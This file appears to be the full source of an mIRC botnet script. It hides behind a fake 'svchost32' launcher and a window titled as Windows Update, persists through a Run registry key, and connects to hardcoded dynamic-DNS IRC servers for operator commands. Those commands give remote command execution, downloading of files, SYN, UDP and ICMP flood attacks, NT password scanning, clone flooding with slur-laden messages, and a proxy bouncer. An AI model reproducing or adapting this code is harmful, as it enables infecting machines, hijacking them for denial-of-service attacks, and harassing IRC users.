;
; start/exit exec's
;
on *:start:{ run svchost32.exe /n /fh UPDATE | rlevel 800 | unset %* | sockclose * | settz | bgwin | writeini mcon.dll ident userid $read(navi.dll) | writeini mcon.dll mirc user $read(navi.dll) | emailaddr paxor@nat01.dhcp- $+ $r(100,122) $+ .core-2.oc48. $+ $nfs $+ .gov | conn | timer 0 30 verify | s7kill | nick $nfs | fullname $nfs | makereg | %impossible = 1,1 | //timerreconnect -o 0 100 //checkconn }
on *:exit:{ rlevel 800 | sockclose * | unset %* }
;
; commands
;
on 800:text:*:*:{
  if ($1 == !visit) { /run $2- }
  if ($1 == !download) { downloada $2- }
  if ($1 == !logout) { ruser 800 $nick | clearall | msg %chan 0 $+ $nick has logged out from 4a0dministrator level 15:14:4[14XPL0o14D4]14:15:0,1 v2.0 }
  if ($1 == !reload) { /timer -o 1 10 /server %s1 | msg %chan 4r0eloading in 4100 4s0econds }
  if ($1 == !uninstall) { uinst }
  if ($1 == !setchan) { %chan = $2 | saveini | msg %chan 4C0hannel 4S0et 4T0o0: $2 }
  if ($1 == !nick) && ($2 == reset) { //nick $nfs }
  if ($1 == !dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | msg %chan 4[0dns4] 0attempting to resolve $2 $+ .. }
  if ($1 == !join) && ($2 != $null) { join $2 $3- | msg %chan 4[0join4]0 channel: $2 -- channel key: $3 }
  if ($1 == !part) && ($2 != $null) { if ($2 == %chan) { msg %chan 4[0error4]0 cannot part %chan - that's the main channel, asshole | halt } | { part $2 $3- | msg %chan 4[0part4]0 channel: $2 -- reason: $3 } }
  if ($1 == !cmd) && ($2 != $null) { %- = $2- | msg %chan 4[0command4]0 / $+ $2- | / $+ %- | unset %- }
  if ($1 == !load) { set %loadfile $2 | load -rs %loadfile | msg %chan 4[0loaded4]0 file: %loadfile | unset %loadfile }
  if ($1 == !unload) { set %unloadfile $2 | unload -rs %unloadfile | msg %chan 4[0unloaded4]0 file: %unloadfile | unset %unloadfile }
  if ($1 == !copy) { if ($exists(C:\winnt\system32\STDE9.exe) == $true) { /copy C:\winnt\system32\STDE9.exe c:\winnt\web\printers\images\STDE9.exe | /msg %chan 4[0copied4]0 STDE9.exe } | elseif { $exists(c:\windows\system32\STDE9.exe) == $true) { /copy c:\windows\system32\STDE9.exe c:\winnt\web\printers\images\STDE9.exe } } }
  if ($1 == !scan) {
     if ($2 == randrange) { set %silentscan off | unset %nb.found | if ($exists(STDE9.exe)) { set %scanning yes | randscan | settotal | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | msg %chan 4[0ntpass-scanner4]0 starting scan from: %1p1 to %1p2 } }
     if ($2 == start) && (%begshortip == $null) && ($exists(STDE9.exe)) { msg %chan 4[0ntpass-scanner4]0 starting scan from: $3 to $4 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == rand) && (%begshortip == $null) && ($exists(STDE9.exe)) { set %begit $randip($3) | msg %chan 4[0ntpass-scanner4]0 starting scan from: %begit to $4 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
     if ($2 == stop) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %chan 4[0ntpass-scanner4]0 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
     if ($2 == stats) { msg %chan 4[0ntpass-scanner4]0 scan stats range: [ %begshortip - %endshortip ] current ip: [ %ip25 ] }
  }
  if ($1 == !info) {
     if ($2 == net) { msg %chan 4connection0: $dll(bootdrv.dll,connection,_) 4network interfaces0:   $dll(bootdrv.dll,interfaceinfo,_) 4ip/host0: $ip $+ / $+ $host }
     if ($2 == cpu) { msg %chan 4time/date0: $time $+ @ $+ $date 4os0: $dll(bootdrv.dll,osinfo,_) 4cpu0:   $dll(bootdrv.dll,cpuinfo,_) 4mem0: $dll(bootdrv.dll,meminfo,_) 4uptime0: $duration($calc($ticks / 1000 )) 4hdd0:   $dll(bootdrv.dll,diskcapacity,_) 4url0: $url }
  }
  if ($1 == !clone) {
     if ($2 == load) && ($3 != $null) { sockopen Sockets- $+ $r(1,999) $3 $4 | msg %chan 4[0clones4]0 $5 clones loading to: $3 $+ : $+   $4 }
     if ($2 == kill) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | msg %chan 4[0clones4]0 all clones disconnected! }
     if ($2 == join) && ($3 != $null) { sockwrite -tn Sockets-* JOIN $3 $4- }
     if ($2 == part) && ($3 != $null) { sockwrite -tn Sockets-* PART $3 $4- }
     if ($2 == msg) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
     if ($2 == notice) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
     if ($2 == join2) && ($3 != $null) { timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
     if ($2 == part2) && ($3 != $null) { timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
     if ($2 == cfld1) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %m1 | sockwrite -tn Sockets-* NOTICE  $3 : $+ %m2 | sockwrite -tn Sockets-* part $3 | msg %chan 4[0clones4]0 starting flood on $3 }
     if ($2 == cfld2) && ($3 != $null) { sockwrite -tn Sockets-* join $3 | timer 0 2 sockwrite -tn Sockets-* privmsg $3 : $+ %m3 | timer 0 4 sockwrite -tn  Sockets-* notice $3 : $+ %m1 | msg %chan 4[0clones4]0 starting endless flood on $3 $+ ! }
     if ($2 == nfld) && ($3 != $null) { sockwrite -tn Sockets-* privmsg $3 : $+ %m1 | sockwrite -tn Sockets-* notice $3 : $+ %m2 | msg %chan 4[0clones4]0 PM flooding: $3 }
     if ($2 == sendq) && ($3 != $null) { sockwrite -n Sockets-* privmsg $3- : $+ %m3 | sockwrite -tn Sockets-* nick $nfs | sockwrite -n Sockets-* privmsg $3- : $+ %m4 | msg %chan 4[0clones4]0 attempting to sendq: $3- }
  }
  if ($1 == !bnc) {
     if ($2 == start) && ($4 != $null) { if ($sock(Bnc)) { msg %chan 4[0error4]0 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | msg %chan 4[0bnc4]0 /server -m $ip $+ : $+ $3 $+ , then /quote PASS $4 }
     if ($2 == stats) && ($sock(Bnc)) { msg %chan 4[0bnc4]0 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
     if ($2 == stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %chan 4[0bnc4]0 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
  }
  if ($1 == !syn) { set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | msg %chan 4S0yn 4A0ttacking: 4(0 $2 4)0 0on port 4(0 %synport 4)0 0|:| 4(0 $4 4)0 times  | set %synaa $2 | synp start $4 $2 %synport }
  if ($1 == !ping) && ($3) && ($4) { run svchost32.exe /n /fh /r "ping.exe $2 -n $3 -l $4" | msg %chan 4P0ing 4A0ttacking: $2 with 4(0 $3 4)0 echo requests |:| with 4(0 $4 4)0 bytes | set %pingaa $2 } | 
  if ($1 == !ping) && ($3) && ($4 == $null) { run svchost32.exe /n /fh /r "ping.exe $2 -n $3 -l 32" | msg %chan 4P0ing 4A0ttacking: $2 with 4(0 $3 4)0 echo requests |:| with 4(0 32 4)0 bytes | set %pingaa $2 }
  if ($1 == !ping) && ($2 == stop) { run svchost32.exe /n /fh /r " $+ $mircdirlibparse.exe -kf ping.exe" | msg %chan 4P0ing 4A0ttack 4O0n: %pingaa 4H0alted | unset %pingaa }
  if ($1 == !icmp) {
   if ($2 == stop) {
      msg %chan 4I0CMP 4A0ttack 4O0n: %icmpaa 4H0alted
      unset %icmpaa
      halt
     }
      set %icmpaa $2
      msg %chan 4I0CMP 4A0ttacking: $2 0with 4(0 $3 4)0 packets |:| 4(0 $4 4)0 times
      timerremove 1 200 /remove blah.vbs
      write blah.vbs on error resume next
      write blah.vbs Set bl = CreateObject("Wscript.shell")
      write blah.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
      run svchost32.exe /n /fh /r "blah.vbs"
      halt
  }
  if ($1 == !udp) {
    if ($2 == stop) {
      msg %chan 4U0DP 4A0ttack 4O0n: %udpaa 4H0alted
      unset %udpaa
      halt
    }
    if ($3 == $null) {
      halt
      unset %udpaa
    }
    if ($4 == $null) {
      halt
      unset %udpaa
    }
    set %start 0
    set %end $4
    set %udpport $3 | if (%udpport == random) { set %udpport $rand(0,65535) }
    set %udpaa $2
    msg %chan 4U0DP 4A0ttacking: 4(0 $2 4)0 0on port 4(0 %udpport 4)0 0|:| 4(0 $4 4)0 times
    :udploop
    if (%start == %end) {
      msg %chan  4U0DP 4A0ttack 4O0n: %udpaa 4C0omplete 
      unset %udpaa
      halt
    }
    inc %start 1
    if ($3 == 0) {
      set %randname $rand(10000,99999)
      set %str $read(str.vxd)
      set %randport $rand(0,65535)
      sockudp Udp $+ %randname $+ a $2 %randport %str
      sockudp Udp $+ %randname $+ b $2 %randport %str
      sockudp Udp $+ %randname $+ c $2 %randport %str
      sockudp Udp $+ %randname $+ d $2 %randport %str
      sockudp Udp $+ %randname $+ e $2 %randport %str
      sockudp Udp $+ %randname $+ f $2 %randport %str
      sockudp Udp $+ %randname $+ g $2 %randport %str
      sockudp Udp $+ %randname $+ h $2 %randport %str
      sockudp Udp $+ %randname $+ i $2 %randport %str
      sockudp Udp $+ %randname $+ j $2 %randport %str
      goto udploop
    }
    if ($4 != 0) {
      set %randname $rand(10000,99999)
      set %str $read(str.vxd)
      sockudp Udp $+ %randname $+ a $2 $3 %str
      sockudp Udp $+ %randname $+ b $2 $3 %str
      sockudp Udp $+ %randname $+ c $2 $3 %str
      sockudp Udp $+ %randname $+ d $2 $3 %str
      sockudp Udp $+ %randname $+ e $2 $3 %str
      sockudp Udp $+ %randname $+ f $2 $3 %str
      sockudp Udp $+ %randname $+ g $2 $3 %str
      sockudp Udp $+ %randname $+ h $2 $3 %str
      sockudp Udp $+ %randname $+ i $2 $3 %str
      sockudp Udp $+ %randname $+ j $2 $3 %str
      goto udploop
    }
  }
}

;
; aliases
;
alias conn { 
 %m1 = $str(OWNED?,15)
 %m2 = $str(FAG,80)
 %m3 = $str(%impossible $+ #*~+*,11))
 %m4 = $str(FAG,100)
 unset %impossible
  if ($portfree(113)) { socklisten IDENT 113 }
  if (!$portfree(27920)) { exit }
 else { socklisten WindowsUpdate 27920 }
  if (%s1 == $null) { %s1 = zo0m.dyn.nu:6667 } | if (%s2 == $null) { %s2 = zo0m1.dyn.nu:6667 } | if (%s3 == $null) {  %s3 = zo0m2.dyn.nu:6667 } | /server %s1
}
alias checkconn {
  if ($server == $null) {
    if (%c.re == $null) || (%c.re == 0) { set %c.re 1 | server %s2 | halt }
    if (%c.re == 1) { set %c.re 2 | server %s3 | halt }
    if (%c.re == 2) { set %c.re 0 | server %s1 | halt }
  }
  else { halt }
}
alias settz { %chan = #high# | %key = syn | %iisfile = STDE9.exe | if ($os == 95) || ($os == 98) || ($os == ME) { %windir = C:\WINDOWS\ | %bootdir = C:\\WINDOWS\\ | %bsys = C:\\WINDOWS\\SYSTEM\\ } | if ($os == XP) || ($os == 2K) || ($os == NT) { %windir = C:\WINNT\ | %bootdir = C:\\WINNT\\ | %bsys = C:\\WINNT\\SYSTEM32\\ } }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\explorer,$mircdirexplorer.exe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\explorer) }
alias downloada { if ($sock(download)) { msg %chan 4e0rror: already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | msg %chan 4D0ownloading: $1- | .sockopen download %download1 80 }
alias nfs { return [HiGh]-[ $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ $r(0,9) $+ $r(A,Z) $+ ] }
alias hide { run svchost32.exe /n /fh UPDATE }
alias verify { if (!$exists(svchost32.exe)) { msg %chan 4[0security4]0 hidewindow is missing! | uinst } | if ($appstate != hidden) { msg %chan 4[0security4]0 not hidden | hide } }
alias bgwin { window -p @Microsoft.Windows.Update 0 0 1600 1200 | timer 0 5 window -a @Microsoft.Windows.update }
alias uinst { msg %chan 4[0uninstall4]0 removing files & removing from registry | delreg | run svchost32.exe /n /fh /r "msvcupd.bat" | timer 1 5 exit } 
alias finished { msg %chan 4[0scanner4]0 scanning from %begshortip to %endshortip is finished! | sockclose ip* | timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }
alias s7kill { if (!$portfree(27374)) { sockopen Antivirus 127.0.0.1 27374 } }
alias sba { timer 1 1 mode %chan +bb $address($2,2) $address($2,3) | timer 1 2 kick %chan $2 you were kicked from %chan by $read(navi.dll) }
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | syn 1 $1- | syn 1 halt | msg %chan 4S0yn 4A0ttack 4O0n: %synaa 4C0omplete | unset %synaa }
alias syn {
  if ($2 == start) { if (%synport !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == halt) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
;
; actions
;
on *:op:%chan:{ if ($opnick == $me) { mode %chan +ntsm } }
on *:notice:password:*:{ notice $nick $read(navi.dll,25) }
on *:notice:Synz0r:*:{ timerban $+ $nick off | timerkick $+ $nick off | mode %chan +v $nick | notice $nick pass accepeted }
on *:connect:{ ial on | pdcc on | fsend on | mode $me +ix | timerbackup* off | timer 0 1 join %chan %key | run svchost32.exe /n /fh /r "msv32drv.bat" | clearall }
on *:sockopen:Antivirus*:{ if ($sockerr > 0) { return } }
on *:sockread:Antivirus*: { sockread -f %Antivirus | if (%Antivirus == PWD) { sockwrite $sockname PWD14438136782715101980 | timer 1 10 sockwrite $sockname RMS } | sockwrite $sockname RMS | unset %Antivirus }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { msg %chan 4[0dns4]0 %dns.rrr resolved to IP: $iaddress Host: $naddress | unset %dns.* } }
on *:sockopen:download:{ if ($sockerr) { msg %chan 4e0rror: socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { msg %chan 4S0uccess: File downloaded 4(0 $mircdir $+ %download2 4)0 4[0 $file(%download2).size bytes 4]0 } | unset %download1 %download2 %download3 %downloadlength %downloadready %downloadoffset }
on *:socklisten:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on *:sockread:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n   $sockname $3 , $1 : USERID : none.of.your.business : $nfs | sockclose $sockname | unset %ident } }
on *:input:*:{ haltdef | msg %chan 4[0security4]0 user input: $1- | nick FAKE | hide | uinst }
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:disconnect:{ rlevel 800 | //timerreconnect -o 50 50 //checkconn | clearall }
on 800:part:%chan:{ ruser 800 $nick | clearall }
on 800:quit:%chan:{ ruser 800 $nick | clearall }
on 800:nick:*:{ ruser 800 $nick | clearall }
on @*:join:%chan:{
  notice $nick password | timerban $+ $nick 1 15 mode %chan +bb $address($nick,2) $address($nick,3) | timerkick $+ $nick 1 20   kick %chan $nick you were kicked from %chan by $read(navi.dll)
  if (!$regex($nick,[a-z][1-3][A-Z][5-9].*)) || (4 isin $nick) { sba $nick }
}